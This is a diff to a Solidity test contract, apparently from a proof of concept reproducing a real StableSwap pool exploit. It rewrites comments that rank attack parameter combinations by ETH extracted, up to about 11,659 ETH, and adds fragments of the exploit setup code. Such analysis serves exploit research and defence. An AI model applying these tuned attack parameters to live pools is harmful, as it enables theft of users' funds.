@@ -1922,12 +1922,19 @@ contract SearchParams is Test {
         // WHAT IT DOES *NOT* PROVE: that 17 maximizes D-collapse or profit. That is an empirical,
         // non-closed-form property of the 30-round iterated map (StableSwap Newton + swap-3
         // truncation), and it is NOT even universally true. Profit is a JOINT (trickAmt, remain)
-        // search. Full-simulation results (Phase1+Phase2+Phase3, per-token profit baseline-matched
-        // to this very test at (17,67000)):
-        //     (17, 67000)  -> 11474.72  ETH   <- robust choice used below (wide attractor band)
-        //     (17, 94000)  -> 11554.998 ETH   <- 17's OWN maximum
-        //     (34, 117000) -> 11586.27  ETH   <- 34 is NON-TPL (mulDown(34,sf)=35 != 34); beats 17
-        //     (34, 143000) -> 11619.90  ETH   <- highest found; beats EVERY 17 combo
+        // search. VERIFIED grid ranking — k in [1,300] x remain in [50000,250000] step 1000;
+        // profit = netWETH + netOSETH, per-token baseline-matched to THIS test at (17,67000); every
+        // value cross-checked byte-for-byte across simulation + real mainnet-fork batchSwap + the
+        // DeFiHackLabs official PoC. Of the 60300 cells, 49 beat the baseline; the notable ones:
+        //     rank   (trickAmt, remain)   total (ETH)    vs baseline    TPL?
+        //     #1     (86, 240000)         11659.2702     +1.608%        no   <- GLOBAL GRID MAX
+        //     #2     (51, 167000)         11624.6606     +1.307%        no
+        //     #3     (34, 143000)         11619.9040     +1.265%        no
+        //     #19    (17, 94000)          11554.9988     +0.700%        yes  <- trickAmt=17's OWN maximum
+        //     base   (17, 67000)          11474.7245     0 (baseline)   yes  <- robust choice used below
+        //   Exact wei: #1 = 11659270229324960935228 ; baseline = 11474724463088359625808 (= threshold).
+        //   The top 3 are all NON-TPL larger t_k (mulDown(t,sf) != t); trickAmt=17's own best is only
+        //   #19, and the global max beats the baseline by just +1.608% (~184.55 ETH).
         //   These high-remain winners sit on razor-thin, chaotic attractors: e.g. trickAmt=34
         //   completes 30 rounds ONLY at remain=143000 — at 140000/142000/144000/145000 it dies
         //   in 0-3 rounds. So max profit rises with remain via a sparse set of ever-narrower
@@ -1936,7 +1943,7 @@ contract SearchParams is Test {
         // CONCLUSION: 17 is (a) the pool-forced TPL threshold [provable], and (b) the CLEAN +
         // ROBUST D-collapse lever at a robust remain — which is why the real exploit and this PoC
         // use (17, 67000). But 17 is NOT the unique profit-maximizing trickAmt: a larger, NON-TPL
-        // trickAmt at a higher (fragile) remain yields more raw profit, e.g. (34, 143000)=11619.9 ETH.
+        // trickAmt at a higher (fragile) remain yields more raw profit; the grid max is (86, 240000)=11659.27 ETH.
         // ─────────────────────────────────────────────────────────────────────────
         uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
         bytes32 poolId = OSETH_BPT.getPoolId();
